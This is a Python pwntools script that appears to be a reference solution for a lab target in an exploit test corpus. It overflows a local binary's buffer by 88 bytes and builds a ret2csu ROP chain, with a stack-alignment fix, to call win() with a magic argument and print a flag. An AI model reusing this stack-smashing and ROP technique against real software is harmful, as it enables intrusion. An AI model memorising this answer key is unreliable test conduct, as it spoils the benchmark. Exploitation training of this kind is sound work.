#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
10_ret2csu_execve.

Technique: advanced ROP variant -- ret2csu. glibc >= 2.34 (this box ships
2.35) removed __libc_csu_init entirely, so the target embeds its own
instruction-for-instruction copy of the classic gadget pair via inline asm
(csu_gadget / csu_gadget_call) -- verified empirically that no
__libc_csu_init symbol or matching gadget sequence exists in a plain
gcc -no-pie binary on this toolchain. No leak is needed: win()'s address
is stored as literal data in the fixed-address global `win_ptr`.

Stack layout (cyclic pattern + corefile): 88 bytes of padding before the
saved return address (buf[72] plus compiler alignment padding).

Alignment note: a `ret`-based return-address overwrite lands the first
gadget 8 bytes off the ABI-mandated 16-byte stack alignment (a `ret`
doesn't do the extra push a real `call` would). The intervening pop/ret
gadgets don't care about their own entry alignment, but the final `call
*(%r15,%rbx,8)` inside csu_gadget_call does -- glibc's win()/fopen() path
now touches malloc() (SIMD-aligned internals) since win() reads flag.txt
at runtime, and an off-by-8 rsp faults inside _int_malloc. One extra bare
`ret` gadget (the tail of win() itself) consumes one more 8-byte stack
slot before csu_gadget, restoring correct alignment for the eventual call.

Chain:
  0. One alignment-fixer `ret` (tail of win()) to correct the parity
     described above.
  1. Overwrite retaddr with csu_gadget (pop rbx,rbp,r12,r13,r14,r15; ret).
  2. Load rbx=0, r12=0(->rsi), r13=0(->rdx), r14=WIN_MAGIC(->edi, 32-bit
     zero-extend), r15=&win_ptr(indirect-call base).
  3. Fall into csu_gadget_call: mov rdx,r13; mov rsi,r12; mov edi,r14d;
     call [r15+rbx*8]  ==  call *win_ptr(WIN_MAGIC)  ==  win(WIN_MAGIC).
  4. Padding for the gadget's own "add rsp,8; pop x6; ret" epilogue after
     win() returns (process exit/crash after this is fine -- the flag has
     already been printed).

Run directly:
    python3 10_ret2csu_execve_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "10_ret2csu_execve")
BINARY = os.path.join(TARGET_DIR, "ret2csu_execve")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"

OFFSET_TO_RETADDR = 88
WIN_MAGIC = 0xCAFEBABE


def exploit():
    elf = ELF(BINARY, checksec=False)
    csu_gadget = elf.symbols["csu_gadget"]
    csu_gadget_call = elf.symbols["csu_gadget_call"]
    win_ptr = elf.symbols["win_ptr"]

    io = process(elf.path, cwd=TARGET_DIR)
    io.recvuntil(b"input> ")

    # Bare `ret` at the tail of win() itself -- alignment fixer, see
    # module docstring.
    ret_fixer = elf.symbols["win"] + (0x4012f1 - 0x4012be)

    payload = b"A" * OFFSET_TO_RETADDR
    payload += p64(ret_fixer)
    payload += p64(csu_gadget)
    payload += p64(0)             # rbx = 0 (indirect-call table index)
    payload += p64(0)             # rbp: junk
    payload += p64(0)             # r12 -> rsi: unused by win()
    payload += p64(0)             # r13 -> rdx: unused by win()
    payload += p64(WIN_MAGIC)     # r14 -> edi (zero-extended): win()'s arg
    payload += p64(win_ptr)       # r15: base of the indirect call
    payload += p64(csu_gadget_call)
    payload += p64(0)             # consumed by "add rsp, 8"
    payload += p64(0) * 6         # the gadget's trailing 6 pops
    payload += p64(0)             # final ret target; crash after this is fine

    io.send(payload)
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 10_ret2csu_execve: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
